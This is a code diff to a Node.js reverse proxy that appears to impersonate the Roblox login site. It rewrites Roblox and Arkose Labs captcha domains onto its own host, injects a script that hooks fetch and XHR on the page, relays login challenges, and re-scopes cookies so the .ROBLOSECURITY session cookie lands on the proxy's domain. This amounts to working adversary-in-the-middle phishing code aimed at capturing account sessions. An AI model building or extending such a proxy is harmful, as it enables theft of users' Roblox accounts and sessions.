@@ -60,12 +60,14 @@ const SUBDOMAIN_MAP = {
     'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
     'metrics':        'https://metrics.roblox.com',
     'locale':         'https://locale.roblox.com',
-    
+
     // CRITICAL: rbxcdn.com domains for captcha
     'apis-rbxcdn':    'https://apis.rbxcdn.com',
     'captcha-rbxcdn': 'https://captcha.rbxcdn.com',
+
+    // CRITICAL: arkoselabs.roblox.com - This is what was missing!
     'arkoselabs-rbxcdn': 'https://arkoselabs.roblox.com',
-    
+
     // ARKOSE LABS (FunCaptcha) - Critical for captcha challenges
     'arkose-api':     'https://roblox-api.arkoselabs.com',
     'arkose-client':  'https://client-api.arkoselabs.com',
@@ -118,7 +120,7 @@ function rewriteChallengeMetadata(metadata, host) {
     try {
         const decoded = Buffer.from(metadata, 'base64').toString('utf8');
         let data = JSON.parse(decoded);
-        
+
         // Rewrite challenge URL if present
         if (data.challengeUrl) {
             data.challengeUrl = rewriteArkoseUrl(data.challengeUrl, host);
@@ -130,7 +132,7 @@ function rewriteChallengeMetadata(metadata, host) {
         if (data.fcTokenUrl) {
             data.fcTokenUrl = rewriteArkoseUrl(data.fcTokenUrl, host);
         }
-        
+
         return Buffer.from(JSON.stringify(data)).toString('base64');
     } catch (e) {
         console.log('   Failed to rewrite challenge metadata:', e.message);
@@ -141,14 +143,10 @@ function rewriteChallengeMetadata(metadata, host) {
 // Rewrite Arkose Labs URLs to proxy
 function rewriteArkoseUrl(url, host) {
     if (!url || typeof url !== 'string') return url;
-    
-    // All domains that need to be proxied
+
+    // All domains that need to be proxied - ORDER MATTERS (most specific first)
     const domains = [
-        // rbxcdn domains
-        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
-        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
-        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
-        // Arkose Labs domains
+        // Arkose Labs domains (more specific)
         ['https://roblox-api.arkoselabs.com', `https://${host}/arkose-api`],
         ['https://client-api.arkoselabs.com', `https://${host}/arkose-client`],
         ['https://cdn.arkoselabs.com', `https://${host}/arkose-cdn`],
@@ -160,12 +158,18 @@ function rewriteArkoseUrl(url, host) {
         ['https://t.arkoselabs.com', `https://${host}/arkose-tile`],
         ['https://assets.arkoselabs.com', `https://${host}/arkose-assets`],
         ['https://roblox-images.arkoselabs.com', `https://${host}/arkose-images`],
+        // rbxcdn domains
+        ['https://apis.rbxcdn.com', `https://${host}/apis-rbxcdn`],
+        ['https://captcha.rbxcdn.com', `https://${host}/captcha-rbxcdn`],
+        // CRITICAL: arkoselabs.roblox.com must be AFTER the more specific arkose domains
+        ['https://arkoselabs.roblox.com', `https://${host}/arkoselabs-rbxcdn`],
         // Roblox challenge domain
         ['https://challenge.roblox.com', `https://${host}/challenge`],
     ];
-    
+
     for (const [from, to] of domains) {
         if (url.startsWith(from)) {
+            console.log(`   Rewriting URL: ${url.substring(0, 50)}... → ${to}`);
             return url.replace(from, to);
         }
     }
@@ -261,18 +265,18 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
     const hasChallengeId = req.headers['rblx-challenge-id'];
     console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
-    
+
     // Debug: Log all incoming headers for login requests
     console.log('   All incoming headers:');
     for (const [k, v] of Object.entries(req.headers)) {
         if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx') || k.includes('rblx')) {
-            const displayValue = typeof v === 'string' 
+            const displayValue = typeof v === 'string'
                 ? (v.length > 100 ? v.substring(0, 100) + '...' : v)
                 : v;
             console.log(`     ${k}: ${displayValue}`);
         }
     }
-    
+
     // Try to decode challenge metadata for debugging
     if (req.headers['rblx-challenge-metadata']) {
         try {
@@ -372,7 +376,7 @@ function forwardResponse(res, response, host, origin, deviceId) {
     let body = response.body;
     const headers = response.headers;
 
-    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' : 
+    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' :
                         headers['rbx-challenge-metadata'] ? 'rbx-challenge-metadata' : null;
     if (metadataKey) {
         const original = headers[metadataKey];
@@ -390,12 +394,12 @@ function forwardResponse(res, response, host, origin, deviceId) {
     const headersToForward = [
         'x-csrf-token',
         'rblx-challenge-id',
-        'rblx-challenge-type', 
+        'rblx-challenge-type',
         'rblx-challenge-metadata',
         'content-type',
         'cache-control',
     ];
-    
+
     for (const key of headersToForward) {
         if (headers[key]) {
             res.set(key, headers[key]);
@@ -414,11 +418,11 @@ function forwardResponse(res, response, host, origin, deviceId) {
     } else if (status === 200) {
         console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY — silent failure`);
     }
-    
+
     if (deviceId) {
         allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
     }
-    
+
     if (allCookies.length > 0) {
         res.set('Set-Cookie', allCookies);
     }
@@ -444,14 +448,10 @@ function buildInjectedScript(host) {
         ["https://roblox.com", PROXY_HOST],
         ["http://roblox.com", PROXY_HOST]
     ];
-    
-    // Arkose Labs domains for captcha
+
+    // Arkose Labs domains for captcha - MUST include arkoselabs.roblox.com
     var ARKOSE_DOMAINS = [
-        // rbxcdn domains (CRITICAL!)
-        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
-        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
-        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
-        // Arkose Labs domains
+        // Arkose Labs domains (more specific first)
         ["https://roblox-api.arkoselabs.com", PROXY_HOST + "/arkose-api"],
         ["https://client-api.arkoselabs.com", PROXY_HOST + "/arkose-client"],
         ["https://cdn.arkoselabs.com", PROXY_HOST + "/arkose-cdn"],
@@ -463,13 +463,18 @@ function buildInjectedScript(host) {
         ["https://t.arkoselabs.com", PROXY_HOST + "/arkose-tile"],
         ["https://assets.arkoselabs.com", PROXY_HOST + "/arkose-assets"],
         ["https://roblox-images.arkoselabs.com", PROXY_HOST + "/arkose-images"],
+        // rbxcdn domains
+        ["https://apis.rbxcdn.com", PROXY_HOST + "/apis-rbxcdn"],
+        ["https://captcha.rbxcdn.com", PROXY_HOST + "/captcha-rbxcdn"],
+        // CRITICAL: arkoselabs.roblox.com must be proxied!
+        ["https://arkoselabs.roblox.com", PROXY_HOST + "/arkoselabs-rbxcdn"],
     ];
-    
+
     // Combine all domains — sort longest-first so specific subdomains match before shorter ones
     var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS).sort(function(a, b) {
         return b[0].length - a[0].length;
     });
-    
+
     function rewriteUrl(url) {
         if (!url || typeof url !== 'string') return url;
         for (var i = 0; i < ALL_DOMAINS.length; i++) {
@@ -487,10 +492,10 @@ function buildInjectedScript(host) {
     window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
     window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
     window.__rblxCaptchaToken = sessionStorage.getItem('__rblxCaptchaToken') || null;
-    
+
     if (window.__rblxChallengeId) {
         log('Restored challenge state from sessionStorage', {
-            id: window.__rblxChallengeId, 
+            id: window.__rblxChallengeId,
             type: window.__rblxChallengeType,
             solved: window.__rblxChallengeSolved,
             captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
@@ -500,7 +505,7 @@ function buildInjectedScript(host) {
     function log(msg, data) {
         console.log('[Proxy]', msg, data || '');
     }
-    
+
     function saveChallengeState() {
         if (window.__rblxChallengeId) sessionStorage.setItem('__rblxChallengeId', window.__rblxChallengeId);
         if (window.__rblxChallengeType) sessionStorage.setItem('__rblxChallengeType', window.__rblxChallengeType);
@@ -523,11 +528,11 @@ function buildInjectedScript(host) {
             log('Constructed CAPTCHA solution metadata', {encoded: encoded.substring(0, 50) + '...'});
             return encoded;
         }
-        
+
         // Standard challenge metadata (for proofofwork, etc.)
         if (!window.__rblxChallengeId || !window.__rblxUserId) {
             log('Cannot construct metadata - missing challengeId or userId', {
-                challengeId: window.__rblxChallengeId, 
+                challengeId: window.__rblxChallengeId,
                 userId: window.__rblxUserId
             });
             return null;
@@ -541,13 +546,13 @@ function buildInjectedScript(host) {
         log('Constructed solution metadata', {data: data, encoded: encoded.substring(0, 50) + '...'});
         return encoded;
     }
-    
+
     // Debug: Log challenge state periodically
     setInterval(function() {
         if (window.__rblxChallengeId) {
             log('Challenge state', {
-                id: window.__rblxChallengeId, 
-                type: window.__rblxChallengeType, 
+                id: window.__rblxChallengeId,
+                type: window.__rblxChallengeType,
                 solved: window.__rblxChallengeSolved,
                 captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
             });
@@ -558,24 +563,24 @@ function buildInjectedScript(host) {
     window.fetch = function(resource, init) {
         var url = typeof resource === 'string' ? resource : resource.url;
         var rewrittenUrl = rewriteUrl(url);
-        
+
         init = init || {};
         init.credentials = 'include';
 
         // AGGRESSIVE: Always check for login endpoint and add challenge headers if available
         var isLoginRequest = url.includes('/v2/login') || url.includes('/auth-api/v2/login') || rewrittenUrl.includes('/auth-api/v2/login');
         var isChallengeContinue = url.includes('challenge/v1/continue') || rewrittenUrl.includes('challenge/v1/continue');
-        
+
         if (isLoginRequest) {
             log('Login request detected!', {
-                url: url, 
+                url: url,
                 rewritten: rewrittenUrl,
                 solved: window.__rblxChallengeSolved,
                 hasId: !!window.__rblxChallengeId,
                 hasUserId: !!window.__rblxUserId,
                 hasCaptchaToken: !!window.__rblxCaptchaToken
             });
-            
+
             // If we have challenge data, ALWAYS add it to login requests
             if (window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
                 var solutionMetadata = constructSolutionMetadata();
@@ -597,12 +602,12 @@ function buildInjectedScript(host) {
                 log('No challenge data available for login');
             }
         }
-        
+
         // Handle challenge continue requests - check for chained challenges
         if (isChallengeContinue) {
             log('Challenge continue request detected', {url: url});
         }
-        
+
         // Now create the resource with merged headers
         if (typeof resource === 'string') {
             resource = rewrittenUrl;
@@ -614,7 +619,7 @@ function buildInjectedScript(host) {
 
         return _fetch.call(this, resource, init).then(function(response) {
             var clonedResponse = response.clone();
-            
+
             // Debug: Log all responses to challenge/login endpoints
             if (url.includes('challenge') || url.includes('login') || url.includes('auth')) {
                 log('Response:', {url: url, status: response.status, solved: window.__rblxChallengeSolved});
@@ -650,7 +655,7 @@ function buildInjectedScript(host) {
                     try {
                         var data = JSON.parse(text);
                         log('Challenge continue response body:', data);
-                        
+
                         // Check if response contains a NEW challenge (chained challenges)
                         if (data.challengeType && data.challengeType !== '') {
                             log('CHAINED CHALLENGE detected! New challenge type:', data.challengeType);
@@ -658,13 +663,13 @@ function buildInjectedScript(host) {
                             window.__rblxChallengeType = data.challengeType;
                             window.__rblxChallengeSolved = false;
                             window.__rblxCaptchaToken = null;
-                            
+
                             // Parse the new challenge metadata
                             if (data.challengeMetadata) {
                                 try {
                                     var meta = JSON.parse(data.challengeMetadata);
                                     log('New challenge metadata:', meta);
-                                    
+
                                     // Handle captcha challenge specifically
                                     if (data.challengeType === 'captcha') {
                                         log('CAPTCHA challenge detected - waiting for user to solve');
@@ -680,7 +685,7 @@ function buildInjectedScript(host) {
                             window.__rblxChallengeSolved = true;
                             saveChallengeState();
                             sessionStorage.setItem('__rblxChallengeSolved', 'true');
-                            
+
                             if (data.challengeToken) {
                                 window.__rblxChallengeToken = data.challengeToken;
                                 sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
@@ -717,11 +722,11 @@ function buildInjectedScript(host) {
     var _send = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function(body) {
         this.withCredentials = true;
-        
+
         // AGGRESSIVE: Check for login endpoint
         var isLoginUrl = this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('/auth-api/v2/login'));
         var isChallengeContinue = this.__rblxUrl && this.__rblxUrl.includes('challenge/v1/continue');
-        
+
         // Debug: Log all XHR requests to login/challenge endpoints
         if (isLoginUrl || isChallengeContinue) {
             log('XHR send:', {url: this.__rblxUrl, solved: window.__rblxChallengeSolved, id: window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
@@ -754,14 +759,14 @@ function buildInjectedScript(host) {
                 if (self.__rblxUrl && (self.__rblxUrl.includes('login') || self.__rblxUrl.includes('challenge'))) {
                     log('XHR response:', {url: self.__rblxUrl, status: self.status});
                 }
-                
+
                 // Handle challenge continue response for XHR
                 if (isChallengeContinue) {
                     try {
                         var text = self.responseText;
                         var data = JSON.parse(text);
                         log('XHR Challenge continue response:', data);
-                        
+
                         // Check for chained challenge
                         if (data.challengeType && data.challengeType !== '') {
                             log('XHR CHAINED CHALLENGE detected! Type:', data.challengeType);
@@ -779,7 +784,7 @@ function buildInjectedScript(host) {
                         // Ignore parse errors
                     }
                 }
-                
+
                 var challengeId = self.getResponseHeader('rblx-challenge-id');
                 var challengeType = self.getResponseHeader('rblx-challenge-type');
                 var challengeMetadata = self.getResponseHeader('rblx-challenge-metadata');
@@ -839,18 +844,18 @@ function buildInjectedScript(host) {
         }
         return element;
     };
-    
+
     // Helper to set captcha token (called by Arkose callback)
     window.setRblxCaptchaToken = function(token) {
         log('Captcha token received from Arkose!', {token: token.substring(0, 30) + '...'});
         window.__rblxCaptchaToken = token;
         window.__rblxChallengeSolved = true;
         saveChallengeState();
-        
+
         // Trigger a new challenge/continue request with the captcha token
         log('Ready to submit captcha solution');
     };
-    
+
     // Helper to clear challenge state after successful login
     window.clearRblxChallengeState = function() {
         window.__rblxChallengeId = null;
@@ -869,7 +874,7 @@ function buildInjectedScript(host) {
         sessionStorage.removeItem('__rblxCaptchaToken');
         log('Challenge state cleared');
     };
-    
+
     // Expose challenge state for debugging
     window.getRblxChallengeState = function() {
         return {
@@ -890,7 +895,7 @@ function buildInjectedScript(host) {
             log('Saved challenge state before unload');
         }
     });
-    
+
     // Intercept login button clicks to debug form submission
     document.addEventListener('click', function(e) {
         var target = e.target;
@@ -900,7 +905,7 @@ function buildInjectedScript(host) {
                 var text = target.textContent || target.innerText || '';
                 if (text.toLowerCase().includes('log in') || text.toLowerCase().includes('login')) {
                     log('Login button clicked!', {
-                        solved: window.__rblxChallengeSolved, 
+                        solved: window.__rblxChallengeSolved,
                         id: window.__rblxChallengeId,
                         userId: window.__rblxUserId,
                         captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
@@ -910,7 +915,7 @@ function buildInjectedScript(host) {
             target = target.parentElement;
         }
     }, true);
-    
+
     // Intercept form submissions
     document.addEventListener('submit', function(e) {
         var form = e.target;
@@ -924,7 +929,7 @@ function buildInjectedScript(host) {
             });
         }
     }, true);
-    
+
     // Monitor for challenge modal/iframe appearance
     var observer = new MutationObserver(function(mutations) {
         mutations.forEach(function(mutation) {
@@ -947,7 +952,7 @@ function buildInjectedScript(host) {
             });
         });
     });
-    
+
     // Start observing when DOM is ready
     if (document.body) {
         observer.observe(document.body, { childList: true, subtree: true });
@@ -969,22 +974,25 @@ function escapeRegex(str) {
 
 function rewriteUrls(body, host) {
     let result = body;
-    
+
     // Sort by target length descending so more specific domains match before shorter ones
     // e.g. challenge.roblox.com must match before a generic *.roblox.com pattern
     const entries = Object.entries(SUBDOMAIN_MAP).sort((a, b) => b[1].length - a[1].length);
-    
+
     for (const [prefix, target] of entries) {
         const domain = target.replace(/^https?:/, '');
         result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
         result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
     }
-    
+
     // Rewrite main Roblox domains
     result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
     result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
     result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
-    
+
+    // CRITICAL: Also rewrite arkoselabs.roblox.com URLs that might be embedded in JS
+    result = result.replace(/https?:\/\/arkoselabs\.roblox\.com/g, `https://${host}/arkoselabs-rbxcdn`);
+
     return result;
 }
 
@@ -1018,7 +1026,7 @@ app.options('*', (req, res) => {
 function createRobloxProxy(prefix, target) {
     const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
     const isArkose = target.includes('arkoselabs.com') || target.includes('funcaptcha.com') || target.includes('rbxcdn.com');
-    
+
     return createProxyMiddleware({
         target,
         changeOrigin: true,
@@ -1027,7 +1035,7 @@ function createRobloxProxy(prefix, target) {
         proxyTimeout: 30000,
         timeout: 30000,
         agent,
-        
+
         on: {
             proxyReq: (proxyReq, req) => {
                 // For Arkose/rbxcdn, use their own origin/referer
@@ -1039,18 +1047,18 @@ function createRobloxProxy(prefix, target) {
                     proxyReq.setHeader('origin', 'https://www.roblox.com');
                     proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                 }
-                
+
                 proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                 proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                 proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                 proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
                 proxyReq.setHeader('connection', 'keep-alive');
-                
+
                 if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                 if (req.headers['rbx-device-id']) proxyReq.setHeader('rbx-device-id', req.headers['rbx-device-id']);
                 if (req.headers['rbxdeviceid']) proxyReq.setHeader('rbxdeviceid', req.headers['rbxdeviceid']);
                 if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
-                
+
                 for (const h of CHALLENGE_HEADERS) {
                     if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
                 }
@@ -1061,7 +1069,7 @@ function createRobloxProxy(prefix, target) {
                     const host = req.headers.host || 'localhost';
                     proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                 }
-                
+
                 const origin = req.headers['origin'] || `https://${req.headers.host}`;
                 proxyRes.headers['access-control-allow-origin'] = origin;
                 proxyRes.headers['access-control-allow-credentials'] = 'true';
